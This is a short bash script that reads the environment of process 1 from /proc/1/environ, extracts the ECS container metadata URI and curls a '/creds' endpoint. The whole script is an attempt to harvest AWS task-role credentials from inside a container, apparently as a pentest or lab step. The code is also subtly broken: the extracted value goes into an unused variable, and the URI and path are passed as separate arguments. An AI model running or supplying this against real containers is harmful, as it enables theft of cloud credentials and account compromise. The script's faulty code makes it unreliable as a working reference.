#!/bin/bash

string=$(cat /proc/1/environ | sed -n 's/^.*ECS_CONTAINER_METADATA_URI_V4=\(.*\)FLUENT_PORT=.*$/\1/p')
echo $ECS_CONTAINER_METADATA_URI_V4 "/creds"
curl $ECS_CONTAINER_METADATA_URI_V4 "/creds"
